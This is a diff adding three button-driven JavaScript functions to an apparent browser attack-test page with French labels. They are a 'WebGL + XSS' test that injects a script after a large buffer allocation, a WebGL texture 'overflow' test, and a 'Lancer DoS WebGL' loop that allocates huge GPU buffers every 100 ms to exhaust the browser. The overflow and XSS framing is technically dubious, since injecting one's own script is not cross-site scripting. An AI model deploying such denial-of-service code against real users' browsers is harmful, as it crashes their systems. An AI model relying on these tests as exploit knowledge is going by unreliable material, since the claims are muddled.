@@ -52,6 +52,71 @@
     }
 </script>
 
+    <button onclick="testWebGLXSSCombo()">Test WebGL + XSS</button>
+<script>
+    function testWebGLXSSCombo() {
+        try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+            if (gl) {
+                var buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                var data = new Float32Array(10000000);
+                gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                var script = document.createElement('script');
+                script.text = 'alert("XSS après overflow réussi")';
+                document.body.appendChild(script);
+            } else {
+                alert('WebGL non pris en charge');
+            }
+        } catch (e) {
+            alert('Erreur: ' + e.message);
+        }
+    }
+</script>
+
+    <button onclick="testWebGLTextureOverflow()">Test WebGL Texture Overflow</button>
+<script>
+    function testWebGLTextureOverflow() {
+        try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+            if (gl) {
+                var texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                var data = new Uint8Array(10000000); // Données excessives
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+                alert('Texture chargée, overflow testé (crash si vulnérable)');
+            } else {
+                alert('WebGL non pris en charge');
+            }
+        } catch (e) {
+            alert('Erreur Texture: ' + e.message);
+        }
+    }
+</script>
+
+    <button onclick="startDoS()">Lancer DoS WebGL</button>
+<script>
+    function startDoS() {
+        var interval = setInterval(() => {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var data = new Float32Array(10000000);
+                    gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                }
+            } catch (e) {
+                clearInterval(interval);
+                alert('DoS terminé, navigateur peut être instable');
+            }
+        }, 100);
+    }
+</script>
+
     <!-- Test XSS via UTF-8 Encoding (CVE-2014-3167) -->
     <button onclick="testXSSUTF8()">Test XSS UTF-8</button>
     <script>
